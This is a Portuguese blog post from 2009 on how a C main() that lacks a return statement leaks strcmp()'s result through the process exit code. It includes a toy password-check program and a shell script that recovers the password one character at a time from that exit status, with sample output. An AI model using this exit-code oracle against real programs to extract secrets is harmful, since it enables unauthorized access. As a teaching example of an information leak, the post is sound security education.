---
layout: post
title:  "return! Sim ou Não?"
date:   2009-01-09
categories: programming
tags: programming sdlc gold
lang: br
ref: return-sim-ou-nao
has-asciinema: false
---

Muitas vezes no cotidianos estamos trabalhando a todo vapor e acabamos deixando passar desapercebido algumas coisas que muitos dizem serem inofensivas. Um exemplo disto está na utilização do comando `return` nos programas escrito em C, pois muitos não sabem sua utilidade (pelo menos na main) e outros simplesmente procuram ignorá-los.

Isto não aconteceu necessariamente comigo, já que sou mais um na fila dos desempregados <s>atoas</s>, entretanto, ao me deparar com um código, percebi que existia uma maneira de tirar proveito desta situação, onde omite-se a utilização do comando `return`. Por isso resolvi compartilhar com os leitores como o post pilot do blog da Hack N' Roll.

Vejamos o seguinte código abaixo:
```c
#include "secret_pass.h"
 
int main(int argc, char **argv)
{
    if (argc != 2)
    {
        fprintf (stderr, "Use: %s [pass]\n", argv[0]);
        exit(0);
    }
 
    if (!strcmp(argv[1], PASS))
    {
        printf ("You won!\n");
    }
}
```

Como podemos perceber, não temos a princípio nada de _Stack Overflow_, _format string_, _integer overflow_, nem nada de baixo nível. A única coisa que alguns devem ter percebidos é que não colocamos <s>esquecemos</s> o comando `return` da `main()`, e isto não tem nada d+. Certo?! Bem... veremos.

Como todos sabem (se não souberem `man strcmp`), a função `strcmp()` é responsável por comparar duas strings e retornar um numero de ordem lexicográfica entre elas. Isto significa que se ao ir comparando caractere-a-caractere, em um dado momento se um caractere do primeiro parâmetro for diferente do segundo, a função irá retornar a diferença entre eles. Caso os parâmetros sejam iguais a função retorna 0 (zero).

Bem, e o que isto tem haver com o retorno de `main()`? Simples! Alguns sabem que o retorno de uma função fica armazenada no registrador `EAX`, e se dizemos que a função `main()` possúi um retorno, o programa retornará o valor de `EAX` para o S.O.. Porém não fornecemos o retorno de `main()`. Só que independente de termos ou não fornecido um retorno, o programa retornará o valor do registrador.

No nosso exemplo, a ultima função a ser executada foi a função `strcmp()` que retorna a comparação lexicográfica e, como não fazemos nada após ela, temos um _Information Leak_ (vazamento de informação) que nos permite obter a senha original que foi utilizada no `strcmp()`.

Com isto, escreví um pequeno script que executa o programa e, a partir do retorno deduz qual a senha que está sendo utilizada na comparação:
```sh
#!/bin/sh
 
PROG=./secret_pass
 
pass=""
while [ 1 ]; do
        # Executa o programa e pega o retorno
        result=$($PROG "$pass")
        ret=$?
 
        # Verifica se tivemos o retorno correto
        if [ "$result" == "You won!" ]; then
                echo -ne "The password is '$pass'\n"
                exit;
        fi;
 
        # Obtem o ascii e concatena com a senha atual
        next=$(echo $ret | awk '{printf("%c", 256 - $1)}')
        pass=$pass$next
done;
```
Como começamos passado uma senha `“”` (vazia), na comparação o programa retorna `0 – NN` (onde `NN `é o ascii do primeiro caracter). Isto geraria um underflow, o que cria a necessidade de voltar pra o valor normal com `256 – NN` (vide código) e com isto obter seu valor ascii.

Veja a execução de nosso script:
```
$ ./get_password.sh
The password is 'ThIs iS mY SecrEt p4ssw0rd'

$ ./secret_pass "ThIs iS mY SecrEt p4ssw0rd"
You won!
```
Como visto, conseguimos obter a senha original sem mecher com assembly, shellcode, overflow, e essas que só nerds como eu gostam.

Bem, este foi meu primeiro post em meu primeiro blog. Espero que agrade e ajude no crescimento de todos.

Hack N' Roll